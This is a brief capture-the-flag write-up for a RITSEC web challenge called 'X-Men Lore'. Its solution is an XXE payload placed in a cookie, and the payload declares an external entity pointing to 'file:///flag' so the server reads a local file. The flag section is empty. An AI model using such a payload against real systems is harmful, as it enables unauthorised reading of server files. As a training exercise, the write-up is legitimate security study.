# X-Men Lore [259 pts]

**Category:** We
**Solves:** 186

## Description
>b"The 90s X-Men Animated Series is better than the movies. Change my mind.\r\n\r\nhttps://xmen-lore-web.challenges.ctf.ritsec.club/"

**Hint**
* b"The flag is in its own file, it shouldnt be too hard to find. Once youre in, try to read the flags\n* The flag file does not have a file extension"

## Solution
```
XXE in cookies
<!--?xml version='1.0' encoding='UTF-8'?>--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag"> ]><input><xmen>&ent;</xmen></input>
```

### Flag

